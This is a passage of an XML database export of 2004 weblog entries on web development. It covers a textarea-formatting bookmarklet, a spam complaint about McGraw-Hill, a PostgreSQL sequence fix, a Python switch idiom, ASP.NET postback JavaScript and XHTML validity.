 &lt;li&gt;Glue everything back together again with a couple of newlines, to make the underlying &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; look pretty.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The bookmarklet comes in two flavours: &lt;a href=&quot;javascript:(function() { var tas = document.getElementsByTagName(&amp;apos;textarea&amp;apos;); for (var i = 0; i &amp;lt; tas.length; i++) { var ta = tas[i]; var text = ta.value.replace(/(\r\n|\r|\n)/g, &amp;apos;\n&amp;apos;); var paras = text.split(/\n{2,}/); for (var i = 0; i &amp;lt; paras.length; i++) { if (/^\* /.test(paras[i])) { var lines = paras[i].split(&amp;apos;\n&amp;apos;); for (var j = 0; j &amp;lt; lines.length; j++) { lines[j] = &amp;apos; &amp;lt;li&amp;gt;&amp;apos; + lines[j].replace(/^\* /, &amp;apos;&amp;apos;) + &amp;apos;&amp;lt;/li&amp;gt;&amp;apos;; } paras[i] = &amp;apos;&amp;lt;ul&amp;gt;\n&amp;apos; + lines.join(&amp;apos;\n&amp;apos;) + &amp;apos;\n&amp;lt;/ul&amp;gt;&amp;apos;; } if (/^= /.test(paras[i])) { paras[i] = &amp;apos;&amp;lt;h4&amp;gt;&amp;apos; + paras[i].replace(/^= /, &amp;apos;&amp;apos;) + &amp;apos;&amp;lt;/h4&amp;gt;&amp;apos;; } if (!/^&amp;lt;(p|ul|li|h4)&amp;gt;/.test(paras[i])) { paras[i] = &amp;apos;&amp;lt;p&amp;gt;&amp;apos; + paras[i]; } if (!/&amp;lt;\/(p|ul|li|h4)&amp;gt;$/.test(paras[i])) { paras[i] += &amp;apos;&amp;lt;/p&amp;gt;&amp;apos;; } } ta.value = paras.join(&amp;apos;\n\n&amp;apos;); } })();&quot;&gt;Expand HTML Shorthand&lt;/a&gt; (the full version) and &lt;a href=&quot;javascript:(function(){var tas=document.getElementsByTagName(&amp;apos;textarea&amp;apos;),ta,t,ps,i,l,j;for(i=0;i&amp;lt;tas.length;i++){ta=tas[i]; t=ta.value.replace(/(\r\n|\r|\n)/g,&amp;apos;\n&amp;apos;);ps=t.split(/\n{2,}/);for(i=0;i&amp;lt;ps.length;i++){if(/^\* /.test(ps[i])){l=ps[i].split(&amp;apos;\n&amp;apos;);for(j=0;j&amp;lt;l.length;j++){l[j]=&amp;apos; &amp;lt;li&amp;gt;&amp;apos;+l[j].replace(/^\* /,&amp;apos;&amp;apos;)+&amp;apos;&amp;lt;/li&amp;gt;&amp;apos;;}ps[i]=&amp;apos;&amp;lt;ul&amp;gt;\n&amp;apos;+l.join(&amp;apos;\n&amp;apos;)+&amp;apos;\n&amp;lt;/ul&amp;gt;&amp;apos;;}if(!/^&amp;lt;(p|ul|li|h4)&amp;gt;/.test(ps[i])){ps[i]=&amp;apos; &amp;lt;p&amp;gt;&amp;apos;+ps[i];}if(!/&amp;lt;\/(p|ul|li|h4)&amp;gt;$/.test(ps[i])){ps[i]+=&amp;apos;&amp;lt;/p&amp;gt;&amp;apos;;}}ta.value=ps.join(&amp;apos;\n\n&amp;apos;);}})();&quot;&gt;Expand HTML Shorthand IE&lt;/a&gt;, which loses header support in order to fit within &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;'s rippling 508 character limit. A more capable bookmarklet could be built using the import-script-stub method &lt;a href=&quot;http://www.sitepoint.com/article/bookmarklets/2&quot;&gt;described in my article&lt;/a&gt;, but the implementation of such a thing is left as an exercise for the reader (I've &lt;em&gt;always&lt;/em&gt; wanted to say that).&lt;/p&gt;

&lt;p&gt;Incidentally, there's a very common bug in markup systems that allow inline styles that proves extremely difficult to fix: that of improperly nested tags. Say you have a system where *&lt;strong&gt;text&lt;/strong&gt;* is bold and _&lt;em&gt;text&lt;/em&gt;_ is italic; what happens when the user enters _&lt;em&gt;italic&lt;/em&gt;*&lt;strong&gt;&lt;em&gt;italic-bold&lt;/em&gt;&lt;/strong&gt;_&lt;strong&gt;bold&lt;/strong&gt;*? Most systems (and that includes Markdown, Textile and my home-rolled Python solution) use naive regular expressions for inline markup processing and will output vadly formed &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;: &lt;code class=&quot;xhtml&quot;&gt;&amp;lt;em&amp;gt;italic&amp;lt;strong&amp;gt;italic-bold&amp;lt;/em&amp;gt;bold&amp;lt;/strong&amp;gt;&lt;/code&gt;. To truly solve this problem requires a context-sensitive parser, which involves an unpleasantly large amount of effort to solve what looks like a simple bug.&lt;/p&gt;</field>
		<field name="created">2004-04-13 04:58:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1393</field>
		<field name="title">McGraw Hill sold me out</field>
		<field name="slug">mcgrawHill</field>
		<field name="body">


&lt;p&gt;Like everyone else on the internet, I get a fair amount of spam. I tend to keep my main work as clean as possible, while skipping over the spam in my lower-traffic personal account and cleaning it up every week or so.&lt;/p&gt;

&lt;p&gt;While cleaning out the latest batch, I noticed that a number of undesirable emails had been delivered to an address which I had used as a &quot;spam trap&quot; - I had only used it once when signing up for a particular service. I ran a search for all messages sent to that address and found this charming missive, dated March 15th:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;As a subscriber to or customer of certain products and services
published by The McGraw-Hill Companies, The McGraw-Hill List Management
Center's commitment to you is to keep you current, by email, on products
and services from third party (non-McGraw-Hill) advertisers that might
be of interest to you. Each email message will be preceded by the name
of the company offering the product or service, so that you know the
source and purpose of the email before opening it.&lt;/p&gt;

&lt;p&gt;If you do not wish to receive these informative emails from The
McGraw-Hill Companies List Management Center, please follow this link
[-- link removed --]&lt;/p&gt;

&lt;p&gt;You will be taken off of this list to receive email messages from these
third party advertisers. It will not affect your status  as a customer
of or subscriber to any McGraw-Hill product or service in any manner.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;They'd opted me in to their third party mailing list. Obviously I would have hit the &quot;I don't want your disgusting spam&quot; link if I had actually seen it, but the subject of the email was &quot;++SPAM++ Special Offers&quot; (the ++SPAM++ part was added by my University's spam filter) so naturally I had skipped straight over it assuming it was yet another piece of worthless spam. I guess that's almost ironic.&lt;/p&gt;

&lt;p&gt;In the month since receiving that email, I've had 12 unwanted commercial emails sent to that address.&lt;/p&gt;

&lt;p&gt;I'm usually &lt;em&gt;very&lt;/em&gt; conscientious about ticking the &quot;don't ever, ever spam me&quot; box when I sign up for things. Maybe I was less vigilant than normal in this case, but I sincerely doubt it. The service I had originally signed up for was a free trial of &lt;a href=&quot;http://www.zinio.com/&quot;&gt;Zinio&lt;/a&gt;. I just checked the registration form and it has two clearly labelled &quot;you may send me junk&quot; boxes, which I'm certain I would have unchecked. I can only conclude that they ignored my initial request, sent me an easily missed &quot;we're about to spam you&quot; message and proceeded to fill my inbox with garbage.&lt;/p&gt;

&lt;p&gt;Maybe this kind of thing is covered by their &lt;a href=&quot;http://www.mcgrawhill.com/privacy.html&quot;&gt;privacy policy&lt;/a&gt; (which I can't access at the moment as their site appears to be unavailable). You know what? I didn't read their privacy policy. I don't read privacy policys. I don't read EULAs either - heck, I don't read anything that looks like it was written by a lawyer and is likely to BREAK IN TO CAPITAL LETTERS at any moment. I assumed that checking the &quot;don't spam me&quot; boxes was enough. Evidently my faith in basic human decency let me down.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.mcgrawhill.com/&quot;&gt;McGraw Hill&lt;/a&gt;: I'm absolutely disgusted with you. Your behaviour in regards to bulk email sickens me, and I will never again knowingly purchase one of your products or support your business in any way.&lt;/p&gt;

&lt;p&gt;Oh, and the final insult? They signed off their treacherous email with &lt;q&gt;Thank you for being a loyal McGraw-Hill customer.&lt;/q&gt; Words fail me.&lt;/p&gt;












</field>
		<field name="created">2004-04-16 07:05:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1394</field>
		<field name="title">Bookmarklet request</field>
		<field name="slug">bookmarkletRequest</field>
		<field name="body">&lt;p&gt;Anyone know if it would be possible to create a bookmarklet that emulates an &lt;a href=&quot;http://www.inetia.com/eyedropper_eng.php&quot;&gt;EyeDropper&lt;/a&gt; style application: as you move it around the page it shows you the hex colour code for the pixel directly under the mouse pointer? I'm pretty sure it can't be done but I'd love to be proved wrong.&lt;/p&gt;</field>
		<field name="created">2004-04-18 23:28:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1395</field>
		<field name="title">AntiRSI for OS X</field>
		<field name="slug">antiRSI</field>
		<field name="body">&lt;p&gt;OK, so I have to admit I gave up on &lt;a href=&quot;http://simon.incutio.com/archive/2003/10/27/avoidingRSI&quot; title=&quot;Avoiding RSI&quot;&gt;WorkRave&lt;/a&gt; after about two weeks - it got on my nerves. Onne Gorter just dropped me an email about his free &lt;a href=&quot;http://ozy.student.utwente.nl/projects/antirsi/&quot;&gt;AntiRSI&lt;/a&gt; program for OS X and I've decided to give it a go. It draws a pretty icon in the Dock with a live updated timer for how long until your next rest break, and the source code is freely available. Let's see if this one lasts longer than WorkRave did.&lt;/p&gt;

</field>
		<field name="created">2004-04-18 23:58:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1396</field>
		<field name="title">Slashdot Humour</field>
		<field name="slug">fromTheGeekJokeDepartment</field>
		<field name="body">&lt;p&gt;Spotted in a thread about &lt;a href=&quot;http://slashdot.org/articles/04/04/20/1738217.shtml&quot; title=&quot;TCP Vulnerability Published&quot;&gt;a newly discovered TCP/IP vulnerability&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://slashdot.org/comments.pl?sid=104791&amp;amp;cid=8920438&quot;&gt;
&lt;p&gt;&lt;strong&gt;No problem (Score:5, Funny)&lt;/strong&gt;&lt;br /&gt;
&lt;em&gt;by niom (638987) on Tuesday April 20, @03:18PM (#8920438)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;I'll just switch to UDP.&lt;/p&gt;

&lt;blockquote cite=&quot;http://slashdot.org/comments.pl?sid=104791&amp;amp;cid=8920559&quot;&gt;
&lt;p&gt;&lt;strong&gt;Re:No problem (Score:5, Funny)&lt;/strong&gt;&lt;br /&gt;
&lt;em&gt;by TheTomcat (53158) on Tuesday April 20, @03:25PM (#8920559)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;more like:&lt;br /&gt;
UDP just I. switch ll'll to I just&lt;/p&gt;
&lt;/blockquote&gt;&lt;/blockquote&gt;</field>
		<field name="created">2004-04-21 01:52:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1397</field>
		<field name="title">Fixing sequence problems in PostgreSQL</field>
		<field name="slug">postgres</field>
		<field name="body">&lt;p&gt;This one's mainly for my own future reference. The following error message in PostgreSQL:&lt;/p&gt;

&lt;pre&gt;&lt;samp&gt;ERROR:  Cannot insert a duplicate key into unique index auth_permissions_pkey&lt;/samp&gt;&lt;/pre&gt;

&lt;p&gt;Is caused by a table with an automatically incremented primary key (set up using the SERIAL keywords in the table creation statement) getting out of sync somehow with the sequence that tracks the next available primary key. You can re-sync the sequence with the following query:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;sql&quot;&gt;SELECT setval('auth_permissions_id_seq', 
  (SELECT max(id) FROM auth_permissions));&lt;/code&gt;&lt;/pre&gt;</field>
		<field name="created">2004-04-21 21:31:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1398</field>
		<field name="title">Python in Mathematics</field>
		<field name="slug">pythonMathematics</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.python.org/pycon/dc2004/papers/15/&quot;&gt;Python in the Mathematics Curriculum&lt;/a&gt; by Kirby Urner is something of a sprawling masterpiece. It really comes in four parts: the first is a history of computer science in education, the second an appraisal of the impact of open source on education and the world at last, the third a dive in to the things that make Python so suitable for enhancing the mathematics curriculum and the fourth a discussion of how computer science and traditional mathematics are likely to play off against each other in the field of high school education.&lt;/p&gt;

&lt;p&gt;It's a long read, but well worth it. Kirby drops in numerous short Python code samples, such as this neat little implementation of Euclid's algorithm for finding the greatest common denominator of two numbers:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;
def gcd(a,b):
    while b:
        a,b = b, a % b
    return a
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;His thoughs on open source and general geek culture are worth digging out even if the main topic of the paper has no interest for you. Here's a sample:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.python.org/pycon/dc2004/papers/15/&quot;&gt;
&lt;p&gt;Additionally, I think a key cultural phenomenon is the evolving perception of geek culture as a whole. What many students discover is a global network of loosely organized, yet talented individuals, including many free spirits. The network is cosmopolitan and guided by some newly articulated principles regarding how some forms of intellectual assets should remain freely accessible and reusable. While these values might seem another ideological pipe dream, were they expressed in merely political terms, in this case the lingua franca of the movement is source code, and licensing agreements designed to protect it against leaking off into the proprietary sector. Even though Python may be used in proprietary ways, Python itself remains free.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Kirby presented the talk at Python DC '04 back in March. I wish I'd been there, but the conference was too close to SxSW for me to make it to both.&lt;/p&gt;</field>
		<field name="created">2004-04-22 02:44:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1399</field>
		<field name="title">Mozilla 1.7 RC 1</field>
		<field name="slug">mozilla17rc1</field>
		<field name="body">&lt;p&gt;There are some interesting tid-bits hidden away in the &lt;a href=&quot;http://www.mozilla.org/releases/mozilla1.7rc1/README.html&quot; title=&quot;What&amp;apos;s New in Mozilla 1.7 RC 1&quot;&gt;release notes&lt;/a&gt; for the new &lt;a href=&quot;http://www.mozilla.org/releases/mozilla1.7rc1/&quot;&gt;Mozilla 1.7 RC 1 release&lt;/a&gt;. The following in particular caught my eye:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.mozilla.org/releases/mozilla1.7rc1/README.html&quot;&gt;
&lt;p&gt;Mozilla 1.7 size and performance have improved dramatically with this release. When compared to Mozilla 1.6, Mozilla 1.7 RC 1 is 7% faster at startup, is 8% faster at window open time, has 9% faster pageloading times, and is 5% smaller in binary size.&lt;/p&gt;

&lt;p&gt;[...]&lt;/p&gt;

&lt;p&gt;Support for server push of XML documents using multipart/x-mixed-replace and XMLHttpRequest.&lt;/p&gt;

&lt;p&gt;[...]&lt;/p&gt;

&lt;p&gt;This release has a new SVG backend. The feature is not yet enabled in the mozilla.org releases but developers may wish to compile with this feature enabled.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Server push of &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; documents? Sounds like it could make for an interesting twist on the remote scripting idea. Hopefully the performance improvements will show up in the next release of Firefox. As for &lt;acronym title=&quot;Scalable Vector Graphics&quot;&gt;SVG&lt;/acronym&gt; support, the sooner that makes it in to Mozilla stable the sooner &lt;acronym title=&quot;XML User interface Language&quot;&gt;XUL&lt;/acronym&gt; will be able to realistically compete with the upcoming rich client platforms from Macromedia and Microsoft.&lt;/p&gt;</field>
		<field name="created">2004-04-22 04:55:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1400</field>
		<field name="title">Kansas City web developer meetup</field>
		<field name="slug">kcmeetup</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://simon.incutio.com/archive/2003/10/18/webMeetup&quot; title=&quot;Lawrence web meetup&quot;&gt;last one&lt;/a&gt; was fun, so we're having another. This time we're shooting for Thursday April 29th at around 8pm, probably at a venue in Kansas City. If you're interested in coming along drop a note to &lt;a href=&quot;http://simon.incutio.com/contact/&quot; title=&quot;Contact me&quot;&gt;myself&lt;/a&gt; or &lt;a href=&quot;http://www.holovaty.com/contact/&quot; title=&quot;Contact Adrian&quot;&gt;Adrian&lt;/a&gt; and we'll add you to the impromptu mailing list.&lt;/p&gt;</field>
		<field name="created">2004-04-26 05:28:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1401</field>
		<field name="title">Curious Javascript in .NET</field>
		<field name="slug">dodgy</field>
		<field name="body">&lt;p&gt;I've never had the opportunity nor the inclination to do anything with .NET; at work we use open source tools for all of our web development, and I prefer open source tools for my own personal experiments as well. At any rate, the &lt;code&gt;javascript:__doPostBack&lt;/code&gt; links I've seen on .NET powered sites such as &lt;a href=&quot;http://channel9.msdn.com/&quot;&gt;Channel 9&lt;/a&gt; and &lt;a href=&quot;http://www.orkut.com/&quot;&gt;Orkut&lt;/a&gt; plain give me the willies.&lt;/p&gt;

&lt;p&gt;Anyway, I decided to view source and see what &lt;code&gt;__doPostBack&lt;/code&gt; actually does. Here's the function:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;function __doPostBack(eventTarget, eventArgument) {
  var theform;
  if (window.navigator.appName.toLowerCase().indexOf(&quot;microsoft&quot;) &amp;gt; -1) {
    theform = document._ctl0;
  }
  else {
    theform = document.forms[&quot;_ctl0&quot;];
  }
  theform.__EVENTTARGET.value = eventTarget.split(&quot;$&quot;).join(&quot;:&quot;);
  theform.__EVENTARGUMENT.value = eventArgument;
  theform.submit();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Note the use of a dubious user-agent based browser detection method. Now what I just don't understand is why that browser detection is there in the first place. There are numerous ways of accessing a form by name using Javascript. &lt;code&gt;document.forms['form-name']&lt;/code&gt; is part of &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; level 0, and is supported by virtually every browser since Netscape 2. &lt;code&gt;document.form-name&lt;/code&gt; is a Microsoft invention. The thing is, &lt;code&gt;document.forms['form-name']&lt;/code&gt; is supported by &lt;acronym title=&quot;MicroSoft&quot;&gt;MS&lt;/acronym&gt; browsers as well. So why do a browser detect and use the &lt;acronym title=&quot;MicroSoft&quot;&gt;MS&lt;/acronym&gt; only method when just using the other method with no detect would work equally as well?&lt;/p&gt;</field>
		<field name="created">2004-04-26 07:42:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1402</field>
		<field name="title">CSS-Discuss Wiki Spam</field>
		<field name="slug">wikiSpam</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://css-discuss.incutio.com/&quot;&gt;css-discuss wiki&lt;/a&gt; has pretty much looked after itself since its inception &lt;a href=&quot;http://simon.incutio.com/archive/2002/10/11/cssWikiLive&quot;&gt;a year and a half ago&lt;/a&gt;, thanks to a small but active community of wiki gardeners. Unfortunately, recent months have seen a rise in the amount of &lt;acronym title=&quot;Search Engine Optimisation&quot;&gt;SEO&lt;/acronym&gt; spam hitting the site. Spam gets deleted pretty quickly, but there's always room for more help to provide a faster turnaround. If you run an aggregator and don't mind spending a minute or so a day tending the wiki you can sign up for the &lt;a href=&quot;http://css-discuss.incutio.com/?action=rss&quot;&gt;RecentChanges RSS feed&lt;/a&gt; and help check over new changes as and when they are made. Your assistance will be greatly appreciated.&lt;/p&gt;</field>
		<field name="created">2004-04-27 20:10:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1403</field>
		<field name="title">Google, circa 1998</field>
		<field name="slug">google98</field>
		<field name="body">&lt;p&gt;Thanks to the ever impressive &lt;a href=&quot;http://www.archive.org/&quot;&gt;Internet Archive&lt;/a&gt; (did you know they host &lt;a href=&quot;http://www.archive.org/movies/prelinger.php&quot; title=&quot;Prelinger Archives&quot;&gt;old public information films&lt;/a&gt; as well?) here's &lt;a href=&quot;http://web.archive.org/web/19980502040303/google.stanford.edu/&quot;&gt;Google's homepage from 1998&lt;/a&gt;. Their searchable index was slightly less than 25 million pages, their hardware was &lt;a href=&quot;http://web.archive.org/web/19980502040406/google.stanford.edu/googlehardware.html&quot; title=&quot;Google Hardware&quot;&gt;less than a dozen machines&lt;/a&gt; apparently held together with lego and their crawler &lt;a href=&quot;http://web.archive.org/web/19980502040427/google.stanford.edu/FAQ.html&quot; title=&quot;Google/BackRub Frequently Asked Questions&quot;&gt;was called BackRub&lt;/a&gt;. Following the links will take you to Sergey and Larry's homepages, where digging a little deeper will even uncover the &lt;a href=&quot;http://google.blogspace.com/archives/001199&quot; title=&quot;Google Weblog: Sergey Brin in Drag - EXCLUSIVE&quot;&gt;now infamous&lt;/a&gt; Sergey-in-drag photo.&lt;/p&gt;

&lt;p&gt;My favourite insight though comes from the &lt;a href=&quot;http://web.archive.org/web/19990218090824/www-pcd.stanford.edu/~page/lego.html&quot;&gt;Legos page&lt;/a&gt; (why do Americans insist on adding an 's'?) on Larry's site:&lt;/p&gt;

&lt;blockquote cite=&quot;http://web.archive.org/web/19990218090824/www-pcd.stanford.edu/~page/lego.html&quot;&gt;&lt;p&gt;I attriubute a great deal of my understanding and ability with mechanical devices to Legos and similar construction toys.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I've often thought that the most important factor in leading me to geek-hood, apart from a C64, was a serious obsession with Lego Technic from an early age.&lt;/p&gt;

&lt;p&gt;I've avoided posting about &lt;a href=&quot;http://battellemedia.com/archives/000627.php&quot; title=&quot;John Battelle&amp;apos;s analysis&quot;&gt;the Google IPO&lt;/a&gt; because know nothing of the world of finance, but you've gotta love that Google's initial &lt;acronym title=&quot;Initial Public Offering&quot;&gt;IPO&lt;/acronym&gt; valuation is &lt;em&gt;e * 10 ^ 9&lt;/em&gt;.&lt;/p&gt;</field>
		<field name="created">2004-05-02 20:43:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1404</field>
		<field name="title">Staying valid</field>
		<field name="slug">stayingValid</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.designbyfire.com/000085.html&quot; title=&quot;XHTML 1.0 Strict! For five minutes at least&quot;&gt;Andrei Herasimchuk&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.designbyfire.com/000085.html&quot;&gt;&lt;p&gt;
There seems no automatic way to keep a site valid with web standards unless you close it off to the rest of the world to contribute to it. I will not do that anytime soon.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;There is: I'm doing it. Next Thursday will mark the one year anniversary of &lt;a href=&quot;http://simon.incutio.com/archive/2003/05/06/knifeEdge&quot;&gt;my switching to application/xhtml+xml&lt;/a&gt; as the content-type header for this site, for user agents that support it. Using that content-type forces Gecko engine browsers to refuse to render pages if they are not well-formed &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt;, so if a page is invalid I hear about it pretty quickly.&lt;/p&gt;

&lt;p&gt;So how do you keep a frequently updated site with data from external sources and user comments valid? There are really only two things you need to do. Firstly, ensure that everything going IN to the system (entries and comments) is valid XHTML. I do that using a &lt;a href=&quot;http://simon.incutio.com/archive/2003/02/23/safeHtmlChecker&quot; title=&quot;Safe HTML Checker&quot;&gt;simple validation system&lt;/a&gt; for comments and &lt;a href=&quot;http://www.squarefree.com/archives/000033.html&quot; title=&quot;Blogidate XML well-formedness&quot;&gt;a bookmarklet&lt;/a&gt; for my own entries. Secondly, any and all data from external sources (my blogroll from blo.gs, blogmark &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt;s added using a bookmarklet) needs to be entity-escaped before being displayed on the site. In my case, a call to &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;'s htmlspecialchars() function is all that's needed.&lt;/p&gt;

&lt;p&gt;I'm not saying my system is ideal - the need for well formed markup in comments is a major usability issue even on a site with an audience consisting mostly of web developers. But it's certainly possible to operate a site in &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; with frequent updates and user comments while staying valid at the same time.&lt;/p&gt;</field>
		<field name="created">2004-05-02 21:55:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1405</field>
		<field name="title">CSS History</field>
		<field name="slug">cssHistory</field>
		<field name="body">&lt;p&gt;John Allsopp: &lt;a href=&quot;http://westciv.typepad.com/dog_or_higher/2004/05/message_to_the_.html&quot;&gt;Message To The Messengers - Props to the old school&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://westciv.typepad.com/dog_or_higher/2004/05/message_to_the_.html&quot;&gt;&lt;p&gt;Of late, with the latest version of Style Master released, bedded down, and well received, I've been a little nostalgic about the old days of CSS. So I thought I might try to ride that wave a little, cast my mind back over my experience of CSS, and talk a little about some people you really should be grateful to if you work with CSS and web standards. Particularly some you might not have heard of.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;There follows a tribute to some of the unsung heroes of the early history of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;. And if that's piqued your interest, Lauren Wood's recent post about &lt;a href=&quot;http://www.laurenwood.org/anyway/index.php?p=11#more-11&quot;&gt;DOM Level 3 becoming a W3C Recommendation&lt;/a&gt; has some insights in to the early days of the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; Working Group, which she chaired up until November 2001.&lt;/p&gt;</field>
		<field name="created">2004-05-05 04:05:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1406</field>
		<field name="title">Don't make me lie to you</field>
		<field name="slug">dontMakeMeLie</field>
		<field name="body">&lt;p&gt;So what's the deal with this?&lt;/p&gt;

&lt;p class=&quot;img&quot;&gt;&lt;img alt=&quot;QuickTime: Enhance the experience. QuickTime Pro screenshot, with buttons to buy now or buy &amp;apos;later&amp;apos;.&quot; height=&quot;200&quot; src=&quot;http://simon.incutio.com/images/2004/quicktimepro.png&quot; width=&quot;525&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I'm sure you've seen it. I get it from QuickTime on Windows, and I get it from QuickTime on my Mac as well. If this was attached to some &lt;a href=&quot;http://www.realplayer.com/&quot;&gt;lousy spyware infested privacy flaunting piece of junk&lt;/a&gt; I wouldn't be so surprised, but it's not: it's from Apple, a company who are meant to pride themselves on the usability of their software; software that normally just gets out of the way. So why bug me with this junk? More importantly, why force me to lie about my intentions? I have absolutely no intention of &lt;em&gt;ever&lt;/em&gt; upgrading to QuickTime Pro - but every time that blasted window comes up I have to promise to put off my purchasing decision until &quot;Later&quot; in order to proceed.&lt;/p&gt;

&lt;p&gt;It annoys me even more because out of all the lousy streaming media formats out there, QuickTime sucks the least. Why spoil the experience with an advert for a product that seems to be made obsolete by Apple's own &lt;a href=&quot;http://www.apple.com/ilife/imovie/&quot;&gt;iMovie&lt;/a&gt; anyway?&lt;/p&gt;</field>
		<field name="created">2004-05-07 02:18:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1407</field>
		<field name="title">What makes a geek?</field>
		<field name="slug">geek</field>
		<field name="body">&lt;p&gt;Meri has a great post up entitled &lt;a href=&quot;http://blog.meriwilliams.com/archives/000118.html&quot;&gt;Because We Are Geeks&lt;/a&gt;, which highlights the differences between geeks and the rest of the world and asks if geeks are really suited to designing and marketing products for non-geeks.&lt;/p&gt;

&lt;p&gt;I'll openly admit that I'm frequently baffled by non-geeks. How could anyone &lt;em&gt;not&lt;/em&gt; want a &lt;a href=&quot;http://www.thinkgeek.com/gadgets/electronic/6a29/&quot;&gt;USB Devil Duckie&lt;/a&gt;? More to the point, I've often wandered what it is that makes some people more inclined to technical pursuits than others. Is it something you've born with, or something that you pick up from your surroundings? I attribute a lot of my geekiness to exposure to both Lego technic and a C64 from an early age, but would I still have been drawn towards geeky endeavours if I'd spent my childhood kicking a football around instead? It's nice to know that Google's Larry Page was &lt;a href=&quot;http://web.archive.org/web/19990218090824/www-pcd.stanford.edu/~page/lego.html&quot;&gt;influenced by lego&lt;/a&gt; as well.&lt;/p&gt;</field>
		<field name="created">2004-05-07 02:29:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1408</field>
		<field name="title">Switch statements in Python</field>
		<field name="slug">switch</field>
		<field name="body">&lt;p&gt;Python doesn't support a native switch statement. I've found myself using the following coding idiom instead recently which seems to work pretty well:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;{'option1': function1,
 'option2': function2,
 'option3': function3,
 'option4': function4}[value]()&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This works with lambdas as well, for inline calculations. Here's a switch statement that assigns to a variable in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;switch ($value) {
    case 'a':
        $result = $x * 5;
        break;
    case 'b':
        $result = $x + 7;
        break;
    case 'c':
        $result = $x - 2;
        break;
}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And here's the equivalent code in Python:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;result = {
  'a': lambda x: x * 5,
  'b': lambda x: x + 7,
  'c': lambda x: x - 2
}[value](x)&lt;/code&gt;&lt;/pre&gt;</field>
		<field name="created">2004-05-07 02:43:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1409</field>
		<field name="title">Google approved PageRank stripping</field>
		<field name="slug">approved</field>
		<field name="body">&lt;p&gt;Blogger are now using the redirect-without-PageRank technique to &lt;a href=&quot;http://help.blogger.com/bin/answer.py?answer=808&quot; title=&quot;Why do links on blogger.com (and in comments) redirect through google.com and blogger.com?&quot;&gt;protect their hosted blogs against comment spam&lt;/a&gt; (also &lt;a href=&quot;http://www.movabletype.org/news/2004_01.shtml#000882&quot; title=&quot; Version 2.66 Released&quot;&gt;used by Moveable Type&lt;/a&gt;). At the risk of sounding incredibly pleased with myself (which I am), &lt;a href=&quot;http://simon.incutio.com/archive/2003/10/13/linkRedirects&quot; title=&quot;New anti-comment-spam measure&quot;&gt;that was my idea&lt;/a&gt;! Sweet.&lt;/p&gt;

